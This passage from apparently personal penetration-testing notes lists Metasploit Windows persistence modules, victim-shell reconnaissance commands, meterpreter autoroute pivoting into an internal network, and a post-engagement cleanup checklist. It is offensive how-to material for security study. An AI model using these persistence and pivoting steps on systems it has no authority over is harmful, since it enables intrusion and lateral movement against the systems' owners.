			>run persistence --h
			>exploit/windows/local/persistence
			>exploit/windows/local/registry_persistence

	Pivoting:
	 Using metasploit
		-> In the victim's shell, always check whether the target is connected to some other network or not.
			>route print
			>ipconfig
			>arp -a
			-> These commands will help you determine the same.
		-> In meterpreter, run
			>run autoroute -s [target-network]/CIDR
				-> This command will setup a route from the victim to the target network.
			>run autoroute -p 
				-> This command will display active routes.

		-> Now, we can background the session, search for portscan.
		-> select the tcp scan.
		-> set the rhosts in the target network.
		-> run the module and now we have successfully pivoted to the other network.

	Cleaning Up:
		Make the system/network as it was when you entered it.
			-> Remove executables, scripts and added files.
			-> Remove malware, rootkits, and added user accounts.
			-> Set settings back to original configurations.
